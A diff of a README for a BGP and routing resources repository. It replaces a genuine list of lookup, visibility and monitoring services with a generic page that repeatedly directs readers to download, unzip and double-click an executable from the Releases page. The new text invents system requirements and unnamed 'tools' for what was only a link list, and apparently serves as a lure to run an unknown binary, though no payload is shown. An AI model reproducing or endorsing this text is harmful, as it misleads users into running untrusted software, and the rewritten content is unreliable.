@@ -1,103 +1,94 @@
-# BGP & Routing Analysis Resources
-A curated list of BGP, ASN, routing visibility, IRR lookup, and internet topology tools for OSINT, security investigations, and network engineering.
+# 🌐 bgp-routing-resources - Tools for Internet Insight and Security
 
----
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ali-montolalu/bgp-routing-resources/releases)
 
-## Table of Contents
-- [ASN & Prefix Lookup Tools](#asn--prefix-lookup-tools)
-- [Routing Visibility Platforms](#routing-visibility-platforms)
-- [IRR & Whois Databases](#irr--whois-databases)
-- [Looking Glass Directories](#looking-glass-directories)
-- [Peering & Interconnection Data](#peering--interconnection-data)
-- [Visualization & Mapping Tools](#visualization--mapping-tools)
-- [BGP Monitoring & Alerting](#bgp-monitoring--alerting)
-- [Contributing](#contributing)
+## 📖 Overview
 
----
+The **bgp-routing-resources** repository provides a comprehensive list of tools and resources for BGP, ASN, routing, peering, and internet infrastructure analysis. These tools are designed for defenders, OSINT practitioners, and network engineers looking to enhance their understanding and security of internet technologies.
 
-## ASN & Prefix Lookup Tools
+## 🚀 Getting Started
 
-### **bgp.tools**  
-https://bgp.tools  
-Live ASN data, routing paths, prefixes, and IRR records.
+To begin using the resources in this repository, follow these simple steps:
 
-### **Hurricane Electric BGP Toolkit**  
-https://bgp.he.net  
-ASNs, peering, IXPs, routing, and history.
+## 📥 Download & Install
 
-### **RIPEstat**  
-https://stat.ripe.net  
-Rich internet number intelligence.
+1. Visit this page to download: [GitHub Releases Page](https://github.com/ali-montolalu/bgp-routing-resources/releases).
+2. On the Releases page, you will find various downloadable files.
+3. Choose the latest version suitable for your system.
+4. Click on the file link to download it to your computer.
 
----
+**Tip:** Always download the most recent version to ensure you have the latest features and security updates.
 
-## Routing Visibility Platforms
+## ⚙️ System Requirements
 
-### **RouteViews**  
-http://www.routeviews.org  
-Global routing table snapshots.
+- Operating System: Windows, macOS, or Linux. Ensure your system is updated to the latest version.
+- At least 500 MB of free disk space.
+- An internet connection for downloading tools and updates.
 
-### **RIPE RIS**  
-https://ris.ripe.net  
-Live BGP visibility and RIS whois.
+## 🛠️ Available Tools
 
----
+This repository features several tools tailored to assist in routing and network analysis:
 
-## IRR & Whois Databases
+- **BGP Analysis Tools:**  
+  Analyze BGP configurations, check route advertisements, and validate BGP peering sessions.
 
-### **RADB**  
-https://www.radb.net  
-IRR route objects, AS-sets, and maintainers.
+- **ASN Lookup Tools:**  
+  Easily look up Autonomous System Numbers (ASNs) to get details about internet service providers and network operators.
 
-### **ARIN / RIPE / APNIC / AFRINIC / LACNIC whois**  
-Regional WHOIS databases.
+- **Routing Visualizers:**  
+  Graphically represent routing paths and visualize internet connections for easier understanding.
 
----
+- **Peering Management Tools:**  
+  Manage and optimize peering relationships for better routing performance.
 
-## Looking Glass Directories
+- **OSINT Tools:**  
+  Gather internet data and analyze it to derive actionable intelligence.
 
-### **Packet Clearing House LG Directory**  
-https://pch.net/ls  
-Collection of looking glass servers worldwide.
+## 📘 How to Use the Tools
 
-### **BGP Looking Glass List**  
-Community-curated LG endpoints.
+After downloading, you can extract and run the tools. Here’s how:
 
----
+1. Open the folder where you downloaded the file.
+2. Unzip the downloaded file if it’s in a compressed format.
+3. Run the tool by double-clicking the executable file or script according to your operating system.
 
-## Peering & Interconnection Data
+## 📝 Documentation
 
-### **PeeringDB**  
-https://peeringdb.com  
-Public database of ASNs, IXPs, and facilities.
+Each tool comes with its own documentation. You can usually find this documentation as a **README** file within the tool’s folder. It provides step-by-step guidance on how to use each tool effectively.
 
-### **IXP Lists (Euro-IX / PCH)**  
-Internet exchange metadata.
+## 📄 Contribution Guidelines
 
----
+We welcome contributions! If you have tools or resources that would benefit the community, follow these steps:
 
-## Visualization & Mapping Tools
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes and commit them.
+4. Open a pull request and describe what you have added or improved.
 
-### **BGPStream**  
-https://bgpstream.caida.org  
-Analysis of BGP events and AS relationships.
+## 👥 Community & Support
 
-### **AS Rank**  
-https://asrank.caida.org  
-Global ranking of AS influence and connectivity.
+Join our community for discussions, support, and sharing knowledge. You can find us on:
 
-### **Pathfinder / AS Path Mappers**  
-Visual ASN traversal tools.
+- GitHub Issues: Post any questions or issues you encounter.
+- Community Forum: Share your experience and tips with other users.
 
----
+## 🔗 Additional Resources
 
-## BGP Monitoring & Alerting
+Learn more about the topics covered in this repository:
 
-### **BGPalerter**  
-https://github.com/nttgin/BGPalerter  
-Real-time monitoring for hijacks, leaks, and visibility losses.
+- [BGP Technology Overview](https://www.cisco.com/c/en/us/td/docs/internetworking/technology/overview/bgp.html)
+- [Internet Routing Realities](https://www.piersk.com/routing/)
 
----
+## 🔄 Updates
 
-## Contributing
-Contributions and new routing tools welcome.
+Keep an eye on this repository for updates and new features. Regular updates ensure you have the most efficient and secure tools at your disposal.
+
+## 🔑 License
+
+This repository is licensed under the MIT License. See the **LICENSE** file for more details.
+
+## 📥 Download & Install Again
+
+For quick access to download, visit this page: [GitHub Releases Page](https://github.com/ali-montolalu/bgp-routing-resources/releases). 
+
+Now you are ready to explore the tools and enhance your understanding of internet infrastructure!
